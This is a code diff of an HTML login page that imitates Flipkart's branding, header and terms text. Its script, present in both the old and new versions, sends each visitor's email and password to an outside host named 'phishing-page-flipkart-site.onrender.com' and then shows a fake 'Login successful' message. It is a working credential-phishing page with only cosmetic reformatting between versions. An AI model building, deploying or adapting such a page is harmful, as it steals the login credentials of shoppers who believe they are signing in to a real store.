@@ -1,367 +1,779 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Flipkart Clone</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
 
-        body {
-            background-color: #f1f3f6;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-        /* Header */
-        .header {
-            background-color: #2874f0;
-            padding: 12px 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 20px;
-        }
+<title>Login - Flipkart Clone</title>
 
-        .logo {
-            color: white;
-            font-size: 24px;
-            font-weight: bold;
-            text-decoration: none;
-            display: flex;
-            flex-direction: column;
-            line-height: 1;
-        }
+<style>
 
-        .logo span {
-            font-size: 11px;
-            font-style: italic;
-            color: #ffe500;
-        }
+* {
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
+}
 
-        .search-box {
-            width: 400px;
-            padding: 8px 12px;
-            border: none;
-            border-radius: 2px;
-            background-color: white;
-            display: flex;
-            align-items: center;
-        }
 
-        .search-box input {
-            border: none;
-            outline: none;
-            flex: 1;
-            font-size: 14px;
-        }
+body {
 
-        .search-btn {
-            color: #2874f0;
-            cursor: pointer;
-        }
+    background:#f1f3f6;
 
-        .login-btn {
-            background-color: white;
-            color: #2874f0;
-            padding: 6px 30px;
-            border: none;
-            border-radius: 2px;
-            font-weight: 600;
-            cursor: pointer;
-        }
+}
 
-        .nav-links {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-            font-size: 14px;
-        }
 
-        /* Navigation Bar */
-        .nav-bar {
-            background-color: white;
-            border-bottom: 1px solid #e0e0e0;
-            display: flex;
-            justify-content: center;
-            gap: 40px;
-            padding: 10px 0;
-            font-size: 13px;
-            font-weight: 500;
-            color: #333;
-        }
+/* HEADER */
 
-        .nav-item {
-            cursor: pointer;
-        }
+.header {
 
-        /* Login Container */
-        .login-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 80vh;
-            padding: 20px;
-        }
+    background:#2874f0;
+    padding:12px 20px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:25px;
 
-        .login-box {
-            display: flex;
-            width: 700px;
-            background-color: white;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
+}
 
-        /* Left Panel */
-        .left-panel {
-            background-color: #2874f0;
-            color: white;
-            padding: 40px 30px;
-            width: 40%;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-        }
 
-        .left-panel h2 {
-            font-size: 28px;
-            margin-bottom: 15px;
-            font-weight: 500;
-        }
+.logo {
 
-        .left-panel p {
-            font-size: 16px;
-            line-height: 1.5;
-            color: #e0e0e0;
-        }
+    color:white;
+    font-size:25px;
+    font-weight:bold;
+    text-decoration:none;
+    display:flex;
+    flex-direction:column;
 
-        .illustration {
-            text-align: center;
-            margin-top: 40px;
-        }
+}
 
-        .illustration img {
-            width: 150px;
-            opacity: 0.8;
-        }
 
-        /* Right Panel */
-        .right-panel {
-            padding: 40px 35px;
-            width: 60%;
-            background-color: #fafafa;
-        }
+.logo span {
 
-        .form-group {
-            margin-bottom: 25px;
-        }
+    color:#ffe500;
+    font-size:12px;
+    font-style:italic;
 
-        .form-group input {
-            width: 100%;
-            padding: 12px 0;
-            border: none;
-            border-bottom: 1px solid #ccc;
-            background-color: transparent;
-            font-size: 14px;
-            outline: none;
-            transition: border-color 0.3s;
-        }
+}
 
-        .form-group input:focus {
-            border-bottom-color: #2874f0;
-        }
 
-        .form-group label {
-            display: block;
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 5px;
-        }
+.search-box {
 
-        .terms-text {
-            font-size: 12px;
-            color: #666;
-            margin: 20px 0;
-            line-height: 1.5;
-        }
+    width:400px;
+    background:white;
+    padding:10px;
+    border-radius:3px;
 
-        .terms-text a {
-            color: #2874f0;
-            text-decoration: none;
-        }
+}
 
-        .submit-btn {
-            width: 100%;
-            padding: 14px;
-            background-color: #fb641b;
-            color: white;
-            border: none;
-            border-radius: 2px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
 
-        .submit-btn:hover {
-            background-color: #e85b19;
-        }
+.search-box input {
 
-        .create-account {
-            text-align: center;
-            margin-top: 25px;
-            font-size: 14px;
-        }
+    width:100%;
+    border:none;
+    outline:none;
+    font-size:14px;
 
-        .create-account a {
-            color: #2874f0;
-            text-decoration: none;
-            font-weight: 500;
-        }
+}
 
-        .create-account a:hover {
-            text-decoration: underline;
-        }
-    </style>
+
+.login-btn {
+
+    background:white;
+    color:#2874f0;
+    border:none;
+    padding:8px 35px;
+    cursor:pointer;
+    font-weight:bold;
+
+}
+
+
+.nav-links {
+
+    color:white;
+    text-decoration:none;
+    font-size:14px;
+
+}
+
+
+/* NAVIGATION */
+
+.nav-bar {
+
+    background:white;
+    display:flex;
+    justify-content:center;
+    gap:35px;
+    padding:12px;
+    border-bottom:1px solid #ddd;
+    font-size:14px;
+
+}
+
+
+
+/* LOGIN CONTAINER */
+
+.login-container {
+
+    min-height:80vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:20px;
+
+}
+
+
+.login-box {
+
+    width:700px;
+    display:flex;
+    background:white;
+    box-shadow:0 2px 10px rgba(0,0,0,0.15);
+
+}
+
+
+
+/* LEFT PANEL */
+
+.left-panel {
+
+    width:40%;
+    background:#2874f0;
+    color:white;
+    padding:40px 30px;
+    display:flex;
+    flex-direction:column;
+    justify-content:space-between;
+
+}
+
+
+.left-panel h2 {
+
+    font-size:28px;
+    margin-bottom:15px;
+
+}
+
+
+.left-panel p {
+
+    color:#eeeeee;
+    line-height:1.5;
+
+}
+
+
+.illustration {
+
+    text-align:center;
+
+}
+
+
+
+/* RIGHT PANEL */
+
+.right-panel {
+
+    width:60%;
+    padding:40px;
+    background:white;
+
+}
+
+
+
+.form-group {
+
+    margin-bottom:25px;
+
+}
+
+
+.form-group input {
+
+    width:100%;
+    padding:12px 0;
+    border:none;
+    border-bottom:1px solid #ccc;
+    outline:none;
+    font-size:14px;
+
+}
+
+
+.form-group input:focus {
+
+    border-bottom:2px solid #2874f0;
+
+}
+
+
+
+.terms-text {
+
+    font-size:12px;
+    color:#666;
+    margin:20px 0;
+    line-height:1.5;
+
+}
+
+
+.terms-text a {
+
+    color:#2874f0;
+    text-decoration:none;
+
+}
+
+
+.submit-btn {
+
+    width:100%;
+    padding:14px;
+    background:#fb641b;
+    color:white;
+    border:none;
+    cursor:pointer;
+    font-size:15px;
+    font-weight:bold;
+
+}
+
+
+.submit-btn:hover {
+
+    background:#e85b19;
+
+}
+
+
+
+.create-account {
+
+    text-align:center;
+    margin-top:25px;
+    font-size:14px;
+
+}
+
+
+.create-account a {
+
+    color:#2874f0;
+    text-decoration:none;
+
+}
+
+
+#message {
+
+    margin-top:15px;
+    text-align:center;
+
+}
+
+
+/* MOBILE */
+
+@media(max-width:700px){
+
+.login-box {
+
+    width:100%;
+    flex-direction:column;
+
+}
+
+
+.left-panel,
+.right-panel {
+
+    width:100%;
+
+}
+
+
+.search-box {
+
+    display:none;
+
+}
+
+}
+
+
+</style>
+
 </head>
+
+
 <body>
-    <!-- Header -->
-    <div class="header">
-        <a href="#" class="logo">
-            Flipkart
-            <span>Explore Plus</span>
-        </a>
-        <div class="search-box">
-            <input type="text" placeholder="Search for products, brands and more">
-            <span class="search-btn">🔍</span>
-        </div>
-        <button class="login-btn">Login</button>
-        <a href="#" class="nav-links">Become a Seller</a>
-        <a href="#" class="nav-links">More ▼</a>
-        <a href="#" class="nav-links">🛒 Cart</a>
-    </div>
 
-    <!-- Navigation -->
-    <div class="nav-bar">
-        <div class="nav-item">Electronics ▼</div>
-        <div class="nav-item">TVs & Appliances ▼</div>
-        <div class="nav-item">Men ▼</div>
-        <div class="nav-item">Women ▼</div>
-        <div class="nav-item">Baby & Kids ▼</div>
-        <div class="nav-item">Home & Furniture ▼</div>
-        <div class="nav-item">Sports, Books & More ▼</div>
-        <div class="nav-item">Flights</div>
-        <div class="nav-item">Offer Zone</div>
-    </div>
 
-    <!-- Login Container -->
-    <div class="login-container">
-        <div class="login-box">
-            <!-- Left Panel -->
-            <div class="left-panel">
-                <div>
-                    <h2>Login</h2>
-                    <p>Get access to your Orders, Wishlist and Recommendations</p>
-                </div>
-                <div class="illustration">
-                    <svg width="150" height="120" viewBox="0 0 150 120">
-                        <rect x="20" y="40" width="110" height="70" fill="white" opacity="0.9" rx="5"/>
-                        <rect x="35" y="55" width="80" height="40" fill="#e3f2fd" rx="3"/>
-                        <circle cx="75" cy="75" r="12" fill="#2874f0"/>
-                        <rect x="20" y="30" width="30" height="25" fill="#ff6f61" rx="2"/>
-                        <rect x="100" y="25" width="25" height="30" fill="#ffd54f" rx="2"/>
-                        <circle cx="130" cy="20" r="15" fill="#ffd54f"/>
-                    </svg>
-                </div>
-            </div>
+<!-- HEADER -->
 
-            <!-- Right Panel -->
-            <div class="right-panel">
-               <!-- Right Panel -->
-<div class="right-panel">
-    <form id="loginForm">
-        <div class="form-group">
-            <input type="text" id="email" name="email" placeholder="Enter Email/Mobile number" required>
-        </div>
-        
-        <div class="form-group">
-            <input type="password" id="password" name="password" placeholder="Enter Password" required>
-        </div>
-        
-        <p class="terms-text">
-            By continuing, you agree to Flipkart's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
-        </p>
-        
-        <button type="submit" class="submit-btn">Login</button>
-        <p id="message" style="margin-top: 15px; text-align: center; color: #333;"></p>
-    </form>
+<div class="header">
 
-    <div class="create-account">
-        New to Flipkart? <a href="#" >Create an account</a>
-    </div>
+<a href="#" class="logo">
+
+Flipkart
+
+<span>Explore Plus</span>
+
+</a>
+
+
+<div class="search-box">
+
+<input type="text" placeholder="Search for products, brands and more">
+
 </div>
 
-<!-- Add this JavaScript at the bottom of your body tag -->
+
+<button class="login-btn">
+Login
+</button>
+
+
+<a href="#" class="nav-links">
+Become a Seller
+</a>
+
+
+<a href="#" class="nav-links">
+More ▼
+</a>
+
+
+<a href="#" class="nav-links">
+🛒 Cart
+</a>
+
+
+</div>
+
+
+
+<!-- NAVIGATION -->
+
+<div class="nav-bar">
+
+<div>Electronics ▼</div>
+
+<div>TVs & Appliances ▼</div>
+
+<div>Men ▼</div>
+
+<div>Women ▼</div>
+
+<div>Baby & Kids ▼</div>
+
+<div>Home & Furniture ▼</div>
+
+<div>Sports ▼</div>
+
+<div>Flights</div>
+
+<div>Offer Zone</div>
+
+</div>
+
+<!-- LOGIN SECTION -->
+
+<div class="login-container">
+
+
+<div class="login-box">
+
+
+
+<!-- LEFT PANEL -->
+
+<div class="left-panel">
+
+
+<div>
+
+<h2>
+Login
+</h2>
+
+
+<p>
+Get access to your Orders, Wishlist and Recommendations
+</p>
+
+
+</div>
+
+
+
+<div class="illustration">
+
+
+<svg width="150" height="120" viewBox="0 0 150 120">
+
+
+<rect 
+x="20" 
+y="40" 
+width="110" 
+height="70" 
+fill="white" 
+rx="5"
+/>
+
+
+<rect 
+x="35" 
+y="55" 
+width="80" 
+height="40" 
+fill="#e3f2fd" 
+rx="3"
+/>
+
+
+<circle 
+cx="75" 
+cy="75" 
+r="12" 
+fill="#2874f0"
+/>
+
+
+<rect 
+x="20" 
+y="30" 
+width="30" 
+height="25" 
+fill="#ff6f61" 
+rx="2"
+/>
+
+
+<rect 
+x="100" 
+y="25" 
+width="25" 
+height="30" 
+fill="#ffd54f" 
+rx="2"
+/>
+
+
+<circle 
+cx="130" 
+cy="20" 
+r="15" 
+fill="#ffd54f"
+/>
+
+
+</svg>
+
+
+</div>
+
+
+
+</div>
+
+
+
+
+
+<!-- RIGHT PANEL -->
+
+<div class="right-panel">
+
+
+
+<form id="loginForm">
+
+
+
+<div class="form-group">
+
+
+<input
+
+type="text"
+
+id="email"
+
+name="email"
+
+placeholder="Enter Email/Mobile number"
+
+required
+
+>
+
+
+</div>
+
+
+
+
+<div class="form-group">
+
+
+<input
+
+type="password"
+
+id="password"
+
+name="password"
+
+placeholder="Enter Password"
+
+required
+
+>
+
+
+</div>
+
+
+
+
+
+<p class="terms-text">
+
+By continuing, you agree to Flipkart's
+
+<a href="#">
+Terms of Use
+</a>
+
+and
+
+<a href="#">
+Privacy Policy
+</a>
+
+.
+
+</p>
+
+
+
+
+
+<button 
+
+type="submit"
+
+class="submit-btn"
+
+>
+
+Login
+
+</button>
+
+
+
+
+
+<p id="message"></p>
+
+
+
+</form>
+
+
+
+
+
+<div class="create-account">
+
+
+New to Flipkart?
+
+<a href="#">
+Create an account
+</a>
+
+
+</div>
+
+
+
+
+</div>
+
+
+</div>
+
+
+</div>
+
+
+
+
+
+<!-- JAVASCRIPT START -->
+
 <script>
-    const API_URL = "https://phishing-page-flipkart-site.onrender.com";
 
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
 
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        const messageEl = document.getElementById('message');
+const API_URL = "https://phishing-page-flipkart-site.onrender.com";
 
-        messageEl.style.color = "#333";
-        messageEl.textContent = "Processing...";
 
-        try {
-            const response = await fetch(`${API_URL}/api/login`, {
-                method: 'POST',
-                mode: 'cors', // ✅ IMPORTANT
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ email, password })
-            });
 
-            // ✅ handle non-json safely
-            let data;
-            try {
-                data = await response.json();
-            } catch {
-                throw new Error("Invalid server response");
-            }
+document
+.getElementById("loginForm")
+.addEventListener("submit", async function(e){
 
-            if (data.success) {
-                messageEl.style.color = 'green';
-                messageEl.textContent = '✓ ' + data.message;
 
-                setTimeout(() => {
-                    alert("Login successful!");
-                }, 1000);
 
-            } else {
-                messageEl.style.color = 'red';
-                messageEl.textContent = '✗ ' + data.message;
-            }
+e.preventDefault();
 
-        } catch (error) {
-            console.error(error);
-            messageEl.style.color = 'red';
-            messageEl.textContent = '✗ Cannot connect to backend';
-        }
-    });
+
+
+
+const email = document.getElementById("email").value;
+
+
+const password = document.getElementById("password").value;
+
+
+const message = document.getElementById("message");
+
+
+
+
+message.style.color = "#333";
+
+message.innerHTML = "Processing...";
+
+
+
+
+try {
+
+
+
+const response = await fetch(`${API_URL}/login`, {
+
+
+
+method:"POST",
+
+
+headers:{
+
+
+"Content-Type":"application/json"
+
+
+},
+
+
+
+body:JSON.stringify({
+
+
+email:email,
+
+
+password:password
+
+
+})
+
+
+
+});
+
+
+
+
+
+const data = await response.json();
+
+
+
+
+
+if(data.status === "success"){
+
+
+
+message.style.color="green";
+
+
+message.innerHTML="✓ " + data.message;
+
+
+
+
+setTimeout(()=>{
+
+
+alert("Login successful!");
+
+
+},500);
+
+
+
+}
+
+else {
+
+
+
+message.style.color="red";
+
+
+message.innerHTML="✗ Login failed";
+
+
+}
+
+
+
+}
+
+catch(error){
+
+
+
+console.error(error);
+
+
+
+message.style.color="red";
+
+
+message.innerHTML="✗ Cannot connect to backend";
+
+
+}
+
+
+
+});
+
+
+
 </script>
 
-
-                <div class="create-account">
-                    New to Flipkart? <a href="#">Create an account</a>
-                </div>
-            </div>
-        </div>
-    </div>
 </body>
+
 </html>
